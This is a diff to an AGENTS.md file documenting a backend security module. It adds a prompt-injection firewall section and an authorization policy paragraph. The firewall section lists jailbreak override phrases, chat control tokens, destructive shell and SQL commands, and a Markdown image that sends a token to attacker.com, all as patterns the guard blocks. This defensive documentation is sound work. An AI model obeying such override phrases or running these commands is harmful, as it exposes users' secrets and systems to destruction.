@@ -26,6 +26,12 @@ The **Security & Production Hardening Service** (`poc/backend/security/`) enforc
 * **Request Correlation Tracking (`correlation.py`)**:
   * `CorrelationIdMiddleware` assigns a unique `X-Correlation-ID` (UUID) to every incoming request.
   * Injects correlation IDs into response headers and Python logging context for distributed tracing.
+* **AI Security Firewall & Prompt Injection Guard (`firewall.py`)**:
+  * **Direct Prompt Injection & Jailbreaks**: Detects and halts attempts to override system prompts (`ignore previous instructions`, `new system prompt`, `you are now DAN/unfiltered`).
+  * **Control Token & Delimiter Hijacks**: Blocks `<|im_start|>`, `<|system|>`, `[INST] <<SYS>>`, and delimiter overrides.
+  * **Destructive Command Interception**: Intercepts dangerous bash commands (`rm -rf /`, `curl | bash`, reverse shells) and destructive database drops (`DROP DATABASE`, `DROP TABLE users`).
+  * **Indirect Prompt Injection (MCP Tool Outputs)**: Sanitizes and neutralizes hidden instruction payloads and Markdown data exfiltration images (`![exfil](https://attacker.com?token=...)`) originating from tool outputs or ingested Web/PR/Issue bodies.
+  * **Fail-Closed Policy & Audit**: Terminated requests trigger `PromptInjectionDetectedError` (HTTP 400) and register an immutable incident in `audit_logs`.
 * **Structured Exception Handling (`errors.py`)**:
   * Uniform error payload formatting (`http_exception_handler` and `generic_exception_handler`).
   * Masks internal stack traces and database errors in production while logging full diagnostics.
@@ -77,3 +83,6 @@ app.add_exception_handler(Exception, generic_exception_handler)
 
 > [!IMPORTANT]
 > Whenever any security logic, token structure, auth dependency, rate limit configuration, or error handling in `poc/backend/security/` is modified, the developer or agent **MUST** update this `AGENTS.md` file within the **SAME commit**.
+
+## Workflow Assistant policy boundary
+The assistant service adds current-database validation after authenticate_request: an ACTIVE user must match the verified org claim, and current memberships determine accessible departments. Stale JWT role/department claims cannot restore revoked rights. Client read/write scopes reduce, never increase, database role rights. Scope-less first-party JWTs retain normal database authorization; future source=mcp callers must supply explicit verified delegated scopes. Organization-wide API-key access is insufficient without a personal user identity. This module does not supply an OAuth authorization server or MCP token verifier.
